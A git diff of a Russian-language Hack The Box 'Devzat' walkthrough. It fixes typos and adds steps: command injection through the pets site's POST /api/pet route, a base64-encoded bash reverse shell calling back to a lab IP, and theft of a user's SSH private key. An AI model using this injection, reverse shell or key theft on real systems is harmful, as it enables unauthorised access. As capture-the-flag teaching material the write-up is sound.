@@ -10,7 +10,7 @@
 
 ![](imgs/Devzat/main_page1.png)
 
-Видим, что 2 ветки гита, 10 клиентов, ... Также предложение подключиться по ssh.
+Видим, что есть 2 ветки гита, 10 клиентов, ... Также предложение подключиться по ssh.
 
 ![](imgs/Devzat/main_page2.png)
 
@@ -24,7 +24,7 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-
 
 ![](imgs/Devzat/gobuster.png)
 
-Спустя некоторое нашелся первый поддомен - pets.devzat.htb
+Спустя некоторое время нашелся первый поддомен - pets.devzat.htb
 
 ![](imgs/Devzat/pets_page.png)
 
@@ -32,7 +32,7 @@ https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-
 
 ![](imgs/Devzat/pets_page2.png)
 
-exit status 1 вместо species.
+В записи exit status 1 вместо species.
 
 ![](imgs/Devzat/pets_page3.png)
 
@@ -68,5 +68,36 @@ exit status 1 вместо species.
 
 ![](imgs/Devzat/add_pet.png)
 
+Нужный нам раут - POST /api/pet
 
+![](imgs/Devzat/api_routes.png)
 
+Попробуем ввести скрипт при добавлении нового питомца.
+
+![](imgs/Devzat/curl.png)
+
+![](imgs/Devzat/curl2.png)
+
+Воспользуемся реверс шелом
+
+![](imgs/Devzat/bash_encode.png)
+
+    YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS8xMzM3IDA+JjE=
+
+![](imgs/Devzat/curl3.png)
+
+Просмотрим директории
+
+![](imgs/Devzat/directories.png)
+
+Из интересного только .ssh. Получили приватный ключ патрика
+
+![](imgs/Devzat/private_key.png)
+
+Подключились с ним по ssh
+
+![](imgs/Devzat/ssh.png)
+
+Попытаемся найти user.txt файлы. Видим что он есть в папке catherine. Однако не хватает прав.
+
+![](imgs/Devzat/user_txt.png)
